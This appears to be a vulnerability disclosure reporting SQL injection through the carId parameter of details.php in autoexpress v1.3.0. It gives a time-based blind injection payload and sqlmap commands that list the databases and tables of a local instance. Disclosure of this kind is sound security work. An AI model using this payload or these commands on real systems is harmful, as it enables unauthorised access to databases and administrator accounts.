### BUG_Author:

xionggang zhang

### Affected version:

autoexpress

### Vendor:

http://autoexpress.com
http://raymart.com

### Software:

autoexpress - v1.3.0

### Vulnerability File:

details.php

### Description:

The autoexpress system v1.3.0 has an SQL injection vulnerability on the details.php page.
The parameter carId was not processed correctly. Hackers can exploit this vulnerability to manipulate the administrator account of the system and have complete control over the information of other accounts.

Status: Severe

The GET parameter carId has SQL injection

Payload: 

> carId=3 AND (SELECT 2064 From (SELECT (SLEEP (5))) mqMc)

Sqlmap command:

> python sqlmap.py -u http://localhost:8080/autoexpress-Master/details.php?carId=3 --dbs  --batch

![图片](https://github.com/torchstar/autoexpress/assets/95554269/41a38655-8c1c-4700-b85c-9230bbfd4a3a)

![图片](https://github.com/torchstar/autoexpress/assets/95554269/d11aab90-53dc-4f78-9886-e5e7947108b3)


> python sqlmap.py -u http://localhost:8080/autoexpress-Master/details.php?carId=3 -D autoexpress --tables  --batch

![图片](https://github.com/torchstar/autoexpress/assets/95554269/0397907c-edfb-4ca0-8d7b-77b65b847773)
